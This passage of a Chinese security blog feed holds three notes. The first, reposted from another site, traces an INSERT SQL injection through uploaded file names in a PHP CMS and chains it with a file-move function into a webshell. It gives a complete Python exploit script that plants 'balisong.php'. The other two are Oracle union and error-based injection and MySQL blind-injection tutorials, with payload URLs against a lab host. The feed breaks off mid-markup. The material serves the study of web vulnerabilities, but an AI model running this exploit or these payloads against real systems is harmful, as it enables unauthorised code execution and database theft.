$GLOBALS[&apos;app&apos;]-&gt;lib(&apos;file&apos;)-&gt;rm($this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&quot;_&quot;.$index.&quot;.part&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            flock($out,LOCK_UN);</span><br><span class="line">        &#125;</span><br><span class="line">        @fclose($out);</span><br><span class="line">        $tmpname = $GLOBALS[&apos;app&apos;]-&gt;lib(&apos;string&apos;)-&gt;to_utf8($tmpname);</span><br><span class="line">        $title = str_replace(&quot;.&quot;.$ext,&apos;&apos;,$tmpname);</span><br><span class="line">        return array(&apos;title&apos;=&gt;$title,&apos;ext&apos;=&gt;$ext,&apos;filename&apos;=&gt;$outfile,&apos;folder&apos;=&gt;$this-&gt;folder,&apos;status&apos;=&gt;&apos;ok&apos;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中<strong>$ext = $this-&gt;file_ext($tmpname);</strong>是检测文件后缀的，看一下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">private function file_ext($tmpname)</span><br><span class="line">    &#123;</span><br><span class="line">        $ext = pathinfo($tmpname,PATHINFO_EXTENSION);</span><br><span class="line">        if(!$ext)&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $ext = strtolower($ext);</span><br><span class="line">        $filetypes = &quot;jpg,gif,png&quot;;</span><br><span class="line">        if($this-&gt;cate &amp;&amp; $this-&gt;cate[&apos;filetypes&apos;])&#123;</span><br><span class="line">            $filetypes .= &quot;,&quot;.$this-&gt;cate[&apos;filetypes&apos;];</span><br><span class="line">        &#125;</span><br><span class="line">        if($this-&gt;file_type)&#123;</span><br><span class="line">            $filetypes .= &quot;,&quot;.$this-&gt;file_type;</span><br><span class="line">        &#125;</span><br><span class="line">        $list = explode(&quot;,&quot;,$filetypes);</span><br><span class="line">        $list = array_unique($list);</span><br><span class="line">        if(!in_array($ext,$list))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return $ext;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>上传是比较严格的，只允许上传后缀是jpg,png,gif这种图片后缀的文件，上传我们无法绕过，但是程序对于上传的文件名没有充份的过滤，在函数末尾，将文件名添加到了返回的数组中:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$tmpname = $GLOBALS[&apos;app&apos;]-&gt;lib(&apos;string&apos;)-&gt;to_utf8($tmpname);</span><br><span class="line">        $title = str_replace(&quot;.&quot;.$ext,&apos;&apos;,$tmpname);</span><br><span class="line">        return array(&apos;title&apos;=&gt;$title,&apos;ext&apos;=&gt;$ext,&apos;filename&apos;=&gt;$outfile,&apos;folder&apos;=&gt;$this-&gt;folder,&apos;status&apos;=&gt;&apos;ok&apos;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里的$tmpname就是我们上传的文件名，注意，不是上传后的文件名，而是上传前的文件名，并且没有对该文件名过滤，然后返回。</p><p>我们回到开头，upload_base函数中去:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$rs = $this-&gt;lib(&apos;upload&apos;)-&gt;getfile($input_name,$cateid);</span><br><span class="line">        if($rs[&quot;status&quot;] != &quot;ok&quot;)&#123;</span><br><span class="line">            return $rs;</span><br><span class="line">        &#125;</span><br><span class="line">        $array = array();</span><br><span class="line">        $array[&quot;cate_id&quot;] = $rs[&apos;cate&apos;][&apos;id&apos;];</span><br><span class="line">        $array[&quot;folder&quot;] = $rs[&apos;folder&apos;];</span><br><span class="line">        $array[&quot;name&quot;] = basename($rs[&apos;filename&apos;]);</span><br><span class="line">        $array[&quot;ext&quot;] = $rs[&apos;ext&apos;];</span><br><span class="line">        $array[&quot;filename&quot;] = $rs[&apos;filename&apos;];</span><br><span class="line">        $array[&quot;addtime&quot;] = $this-&gt;time;</span><br><span class="line">        $array[&quot;title&quot;] = $rs[&apos;title&apos;];</span><br><span class="line">        $array[&apos;session_id&apos;] = $this-&gt;session-&gt;sessid();</span><br><span class="line">        $array[&apos;user_id&apos;] = $this-&gt;session-&gt;val(&apos;user_id&apos;);</span><br><span class="line">        $arraylist = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);</span><br><span class="line">        if(in_array($rs[&quot;ext&quot;],$arraylist))&#123;</span><br><span class="line">            $img_ext = getimagesize($this-&gt;dir_root.$rs[&apos;filename&apos;]);</span><br><span class="line">            $my_ext = array(&quot;width&quot;=&gt;$img_ext[0],&quot;height&quot;=&gt;$img_ext[1]);</span><br><span class="line">            $array[&quot;attr&quot;] = serialize($my_ext);</span><br><span class="line">        &#125;</span><br><span class="line">        $id = $this-&gt;model(&apos;res&apos;)-&gt;save($array);</span><br></pre></td></tr></table></figure><p>可以看到这里将返回值中的title的值赋值给了$array[‘title’],这个值是我们可控的，然后将$array带入到了save函数中，我们看一下该函数:</p><p>在/framework/model/res.php中第279行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public function save($data,$id=0)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$data || !is_array($data))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if($id)&#123;</span><br><span class="line">            return $this-&gt;db-&gt;update_array($data,&quot;res&quot;,array(&quot;id&quot;=&gt;$id));</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return $this-&gt;db-&gt;insert_array($data,&quot;res&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>将$data带入到了insert_array函数中，我们看一下该函数:</p><p>/framework/engine/db/mysqli.php中第211行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public function insert_array($data,$tbl,$type=&quot;insert&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$tbl || !$data || !is_array($data))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if(substr($tbl,0,strlen($this-&gt;prefix)) != $this-&gt;prefix)&#123;</span><br><span class="line">            $tbl = $this-&gt;prefix.$tbl;</span><br><span class="line">        &#125;</span><br><span class="line">        $type = strtolower($type);</span><br><span class="line">        $sql = $type == &apos;insert&apos; ? &quot;INSERT&quot; : &quot;REPLACE&quot;;</span><br><span class="line">        $sql.= &quot; INTO &quot;.$tbl.&quot; &quot;;</span><br><span class="line">        $sql_fields = array();</span><br><span class="line">        $sql_val = array();</span><br><span class="line">        foreach($data AS $key=&gt;$value)&#123;</span><br><span class="line">            $sql_fields[] = &quot;`&quot;.$key.&quot;`&quot;;</span><br><span class="line">            $sql_val[] = &quot;&apos;&quot;.$value.&quot;&apos;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        $sql.= &quot;(&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;</span><br><span class="line">        return $this-&gt;insert($sql);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>就是将该数组中的键值遍历出来，将键作为字段名，将值作为对应字段的值。可以看到，对于值是没有进行转义的，其中包括我们可以控制的title的值，那么这里就产生了一个insert的注入。那么这个注入我们有什么用呢？当然首先想到的是一个出数据，但是对于update 或者insert注入，一般来说我会想办法将这个注入升级一下危害。注意这个注入是一个insert注入，并且insert语句是可以一次插入多条内容的，我们不能控制当前这条insert语句的内容，我们可以控制下一条的内容，比如说像这样:<br>Insert into file values(1,2,3,),(4,5,6)<br>那么我们控制下一条的内容有什么用，好，现在我们开始看/framework/www/upload_control.php中的第103行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public function replace_f()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;popedom();</span><br><span class="line">        $id = $this-&gt;get(&quot;oldid&quot;,&apos;int&apos;);</span><br><span class="line">        if(!$id)&#123;</span><br><span class="line">            $this-&gt;json(P_Lang(&apos;没有指定要替换的附件&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $old_rs = $this-&gt;model(&apos;res&apos;)-&gt;get_one($id);</span><br><span class="line">        if(!$old_rs)&#123;</span><br><span class="line">            $this-&gt;json(P_Lang(&apos;资源不存在&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $rs = $this-&gt;lib(&apos;upload&apos;)-&gt;upload(&apos;upfile&apos;);</span><br><span class="line">        if($rs[&quot;status&quot;] != &quot;ok&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;json(P_Lang(&apos;附件上传失败&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $arraylist = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);</span><br><span class="line">        $my_ext = array();</span><br><span class="line">        if(in_array($rs[&quot;ext&quot;],$arraylist))</span><br><span class="line">        &#123;</span><br><span class="line">            $img_ext = getimagesize($rs[&quot;filename&quot;]);</span><br><span class="line">            $my_ext[&quot;width&quot;] = $img_ext[0];</span><br><span class="line">            $my_ext[&quot;height&quot;] = $img_ext[1];</span><br><span class="line">        &#125;</span><br><span class="line">        //替换资源</span><br><span class="line">        $this-&gt;lib(&apos;file&apos;)-&gt;mv($rs[&quot;filename&quot;],$old_rs[&quot;filename&quot;]);</span><br><span class="line">        $tmp = array(&quot;addtime&quot;=&gt;$this-&gt;time);</span><br><span class="line">        $tmp[&quot;attr&quot;] = serialize($my_ext);</span><br><span class="line">        $this-&gt;model(&apos;res&apos;)-&gt;save($tmp,$id);</span><br><span class="line">        //更新附件扩展信息</span><br><span class="line">        $this-&gt;model(&apos;res&apos;)-&gt;gd_update($id);</span><br><span class="line">        $rs = $this-&gt;model(&apos;res&apos;)-&gt;get_one($id);</span><br><span class="line">        $this-&gt;json($rs,true);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里我们输入一个oldid的值，然后从res表中查找出这一行的数据，然后将我们上传的文件mv到$old_rs[‘filename’]。<br>mv函数的定义在/framework/libs/file.php中第264行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public function mv($old,$new,$recover=true)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!file_exists($old))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if(substr($new,-1) == &quot;/&quot;)&#123;</span><br><span class="line">            $this-&gt;make($new,&quot;dir&quot;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;make($new,&quot;file&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(file_exists($new))&#123;</span><br><span class="line">            if($recover)&#123;</span><br><span class="line">                unlink($new);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $new = $new.basename($old);</span><br><span class="line">        &#125;</span><br><span class="line">        rename($old,$new);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通过上文说到的，我们可以控制res表中的一行记录的值，那么这个filename也是我们可控的，那么我们如果将filename设置为/res/balisong.php。那么我上传的图片文件就会重新命名成/res/balisong.php。我们就达到了一个getshell的目的。</p><p>由于上传的文件名的特殊性。导致我们不能带有斜杠，那么怎么办呢？我们可以利用十六进制编码来绕过，具体的漏洞利用过程就不细说了，比较复杂，所以直接上exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">\#-*- coding:utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import re</span><br><span class="line">if len(sys.argv) &lt; 2:</span><br><span class="line">    print u&quot;Usage: exp.py url [PHPSESSION]\r\nFor example:\r\n[0] exp.py http://localhost\r\n[1] exp.py http://localhost 6ogmgp727m0ivf6rnteeouuj02&quot;</span><br><span class="line">    exit()</span><br><span class="line">baseurl = sys.argv[1]</span><br><span class="line">phpses = sys.argv[2] if len(sys.argv) &gt; 2 else &apos;&apos;</span><br><span class="line">cookies = &#123;&apos;PHPSESSION&apos;: phpses&#125;</span><br><span class="line">if baseurl[-1] == &apos;/&apos;:</span><br><span class="line">    baseurl = baseurl[:-1]</span><br><span class="line">url = baseurl + &apos;/index.php?c=upload&amp;f=save&apos;</span><br><span class="line">files = [</span><br><span class="line">    (&apos;upfile&apos;, (&quot;1&apos;,&apos;r7ip15ijku7jeu1s1qqnvo9gj0&apos;,&apos;30&apos;,&apos;&apos;),(&apos;1&apos;,0x7265732f3230313730352f32332f,0x393936396465336566326137643432352e6a7067,&apos;&apos;,0x7265732f62616c69736f6e672e706870,&apos;1495536080&apos;,&apos;2.jpg&quot;,</span><br><span class="line">                &apos;&lt;?php phpinfo();?&gt;&apos;, &apos;image/jpg&apos;)),</span><br><span class="line">]</span><br><span class="line">files1 = [</span><br><span class="line">    (&apos;upfile&apos;,</span><br><span class="line">     (&apos;1.jpg&apos;, &apos;&lt;?php phpinfo();?&gt;&apos;, &apos;image/jpg&apos;)),</span><br><span class="line">]</span><br><span class="line">r = requests.post(url, files=files, cookies=cookies)</span><br><span class="line">response = r.text</span><br><span class="line">id = re.search(&apos;&quot;id&quot;:&quot;(\d+)&quot;&apos;, response, re.S).group(1)</span><br><span class="line">id = int(id) + 1</span><br><span class="line">url = baseurl + &apos;/index.php?c=upload&amp;f=replace&amp;oldid=%d&apos; % (id)</span><br><span class="line">r = requests.post(url, files=files1, cookies=cookies)</span><br><span class="line">shell = baseurl + &apos;/res/balisong.php&apos;</span><br><span class="line">response = requests.get(shell)</span><br><span class="line">if response.status_code == 200:</span><br><span class="line">    print &quot;congratulation:Your shell:\n%s\npassword:balisong&quot; % (shell)</span><br><span class="line">else:</span><br><span class="line">    print &quot;oh!Maybe failed.Please check&quot;</span><br></pre></td></tr></table></figure><p>系统默认是不需要注册登录即可上传文件的。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>其实这种情况还是蛮多的，有些系统会将上传前的文件名入库，如果过滤不当，就可以注入了。并且insert，update这种注入危害是可以进一步扩大的。</p><p>转载于<a href="https://xz.aliyun.com/t/1569/#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/1569/#toc-1</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Oracle注入-报错注入</title>
      <link href="/2019/12/07/oracle%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/12/07/oracle%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="Oracle-报错注入"><a href="#Oracle-报错注入" class="headerlink" title="Oracle 报错注入"></a>Oracle 报错注入</h2><p>进行测试或漏洞挖掘的时候发现出现了数据库报错信息，可以优先选择报错注入，报错注入就是使用报错的方式将查询数据的结果带出到错误页面中，使用报错注入需要使用类似 1=[报错语句]，1&gt;[报错语句]，使用比较运算符，这样的方式进行报错注入（MYSQL仅使用函数报错即可）</p><h2 id="注入小提示"><a href="#注入小提示" class="headerlink" title="注入小提示"></a>注入小提示</h2><ul><li>Oracle 使用查询语句获取数据时需要跟上表名</li><li>没有表的情况下可以使用dual，dual是Oracle的虚拟表，用来构成select的语法规则.</li><li>Oracle保证dual里面永远只有一条记录。</li><li>填充字段数要用null填充</li><li>Oracle的单行注释符号是–</li></ul><p>oracle注入我们首先想到的是联合查询注入：</p><h2 id="oracle联合查询的注入步骤："><a href="#oracle联合查询的注入步骤：" class="headerlink" title="oracle联合查询的注入步骤："></a>oracle联合查询的注入步骤：</h2><ul><li>判断字段数(一些闭合注释)：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;order by 4--</span><br></pre></td></tr></table></figure><ul><li>通过测试数据类型来判断回显位置(发现可输出字符串的为2,3,4个字段)：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;union all select null,&apos;null&apos;,&apos;null&apos;,&apos;null&apos; from dual--</span><br></pre></td></tr></table></figure><ul><li>获取数据库版本信息：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union all select null,(select banner from  sys.v_$version where rownum=1),null,null from dual --</span><br></pre></td></tr></table></figure><ul><li>获取表名:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union all select null,(select table_name from user_tables where table_name=&apos;ADMIN&apos; and rownum=1),null,null from dual --</span><br></pre></td></tr></table></figure><ul><li>获取关键表中的列名(我们可以通过<strong>and 字段名&lt;&gt;字段值</strong>来排除不想要的字段名，就是说将 字段名=指定字段值进行排除)：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,(select column_name from user_tab_columns where rownum=1),null from dual --</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and rownum=1 and column_name&lt;&gt;&apos;ID&apos;),null from dual --</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,(select column_name from user_tables where table_name=&apos;ADMIN&apos; and rownum=1 and column_name&lt;&gt;&apos;ID&apos; and column_name&lt;&gt;&apos;USER_NAME&apos;),null from dual --</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,(select column_name from user_tables where table_name=&apos;ADMIN&apos; and rownum=1 and column_name&lt;&gt;&apos;ID&apos; and column_name&lt;&gt;&apos;USER_NAME&apos; and column_name&lt;&gt;&apos;PASSWORD&apos;),null from dual --</span><br></pre></td></tr></table></figure><p>通过逐步排除来得到自己所想要的字段名；</p><ul><li>再获取关键字段中的字段数据</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select FLAG_FLAG from admin --</span><br></pre></td></tr></table></figure><h2 id="oracle-报错注入"><a href="#oracle-报错注入" class="headerlink" title="oracle 报错注入"></a>oracle 报错注入</h2><ul><li>CTXSYS.DRITHSX.SN()</li></ul><p>去查询关于主题的对应关键词，然后因为查询失败（应该是这个用户没有创建和查询的权限，默认情况没有创建，爆出未查询到的错误从而爆出查询内容，我们可以通过这个函数将查询内容通过报错爆出查询内容；</p><ul><li>oracle注入的一些数据库语句：</li></ul><p>select bannner from sys.v_$version where rownum=1     查询数据库版本；</p><p>select table_name from user_tables where rownum=1  查询表名；</p><p>select column_name from user_tab_columns where table_name=’ADMIN’ and rownum=1  查询字段名；</p><p>select [字段] from [表名]  查询内容；</p><p>select * from all_table 查询出所有表；</p><p>select * from user_tables 查询出当前用户的表；</p><p>select * from all_tab_columns  查询所有的字段；</p><p>select * from user_tab_columns 查询当前用户的字段；</p><h2 id="oracle-报错注入的步骤："><a href="#oracle-报错注入的步骤：" class="headerlink" title="oracle 报错注入的步骤："></a>oracle 报错注入的步骤：</h2><ul><li>闭合注释语句：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos;--</span><br></pre></td></tr></table></figure><ul><li>查询表名：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos; and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and rownum=1))--</span><br></pre></td></tr></table></figure><ul><li>查询第一个字段：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos; and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and rownum=1))--</span><br></pre></td></tr></table></figure><ul><li>查询除ID外的字段，并返回一行结果：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos; and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and column_name&lt;&gt;&apos;ID&apos; and rownum=1))--</span><br></pre></td></tr></table></figure><ul><li>查询除ID、USER_NAME外的字段，并返回一行结果：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos; and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and column_name&lt;&gt;&apos;ID&apos; and column_name&lt;&gt;&apos;USER_NAME&apos; and rownum=1))--</span><br></pre></td></tr></table></figure><ul><li>查询除ID、USER_NAME、PASSWORD外的字段，并返回一行结果：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos; and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and column_name&lt;&gt;&apos;ID&apos; and column_name&lt;&gt;&apos;USER_NAME&apos; and column_name&lt;&gt;&apos;PASSWORD&apos; and rownum=1))--</span><br></pre></td></tr></table></figure><ul><li>查询到我们需要的字段FLAG_FLAG</li></ul><ul><li>查询字段内容：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos; and 1=ctxsys.drithsx.sn(1,(select FLAG_FLAG from ADMIN where rownum=1))--</span><br></pre></td></tr></table></figure></li></ul><p>最后可以成功查询到我们想知道的字段内容！</p><h3 id="常用的一些报错函数："><a href="#常用的一些报错函数：" class="headerlink" title="常用的一些报错函数："></a>常用的一些报错函数：</h3><ul><li>utl_inaddr.get_host_name()</li><li>ctxsys.drithsx.sn()</li><li>XMLType()</li><li>dbms_xdb_version.checkin()</li><li>dbms_xdb_version.makeversioned()</li><li>dbms_xdb_version.uncheckout()</li><li>dbms_utility.sqlid_to_sqlhash()</li><li>ordsys.ord_dicom.getmappingxpath()</li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql盲注</title>
      <link href="/2019/12/07/mysqlmanzu/"/>
      <url>/2019/12/07/mysqlmanzu/</url>
      
        <content type="html"><![CDATA[<h2 id="sql盲注介绍"><a href="#sql盲注介绍" class="headerlink" title="sql盲注介绍"></a>sql盲注介绍</h2><p>何为盲注？盲注就是在 sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显到前端页面，而对于攻击者来说也缺少了非常重要的“调试信息”，此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p><ul><li><strong>布尔盲注：</strong></li></ul><p>布尔盲注，顾名思义，只有Ture和False，也就是说它只会根据你的注入信息返回Ture跟False，也就是说，不会再显示之前的显错信息了。(我们可以利用逻辑判断进行截取字符串）</p><ul><li><strong>时间盲注</strong></li></ul><p>界面返回值只有一种结果ture，无论输出任何值,返回情况都会按ture值来返回正常页面，加入特定的时间函数，通过查看web页面返回时间差来判断注入的语句是否正确。</p><h2 id="常用盲注函数"><a href="#常用盲注函数" class="headerlink" title="常用盲注函数"></a>常用盲注函数</h2><ul><li><p>length（）函数 返回字符串的长度</p></li><li><p>substr（）函数 截取字符串 </p></li><li></li><li><p>ascii（） 返回字符串的ascii码</p></li><li><p>sleep（n）将程序挂起一段时间，n为n秒</p></li><li><p>if（expr1，expr2，expr3）判断语句，如果第一个语句正确就执行第二个，如果错误，就执行第三个语句；</p></li></ul><h3 id="布尔盲注一般流程："><a href="#布尔盲注一般流程：" class="headerlink" title="布尔盲注一般流程："></a>布尔盲注一般流程：</h3><p>猜解数据库名称长度：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos;and(length(database()))&gt;9--+/23%(#)</span><br></pre></td></tr></table></figure></p><p>利用ascii码猜解当前数据库名称：返回正常，说明数据库名称第一位是s</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(ascii(substr(database(),1,1)))=115--+</span><br></pre></td></tr></table></figure><p>返回正常，说明数据库名称第二位是e（通过移动第二位数来一位一位的猜出……<br>）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(ascii(substr(database(),2,1)))=101--+</span><br></pre></td></tr></table></figure></p><p>猜表名：返回正常，说明数据库第一个表名的第一位是e<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and(adcii(substr((select table name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101</span><br><span class="line">--+</span><br></pre></td></tr></table></figure></p><p>猜字段名：返回正常，说明zkaq表中的列名称第一位是f<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(ascii(substr((select column_name from information_schema.columns where table_name=&apos;zkaq&apos; limit 0,1),1,1)))=102--+</span><br></pre></td></tr></table></figure></p><p>猜内容：返回正常，说明zKaQ列第一位是z<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 